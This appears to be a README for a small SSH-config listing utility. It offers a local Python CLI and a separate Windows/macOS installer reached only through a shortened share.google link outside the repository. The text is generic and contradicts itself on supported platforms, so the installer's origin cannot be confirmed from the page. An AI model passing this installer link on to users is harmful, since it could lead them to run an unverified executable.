![SSH Config List](assets/hero.png)

# SSH Config List

*Which SSH aliases you actually have.*

## About

**SSH Config List** is a desktop utility. List Host entries from ~/.ssh/config with HostName and User, hiding IdentityFile contents.

A config file grows. You forget the alias.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Host table
- Hides key paths by default
- Optional JSON
- Does not change the file

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/george9874-commits/ssh-config-list

MIT license. See `LICENSE`.
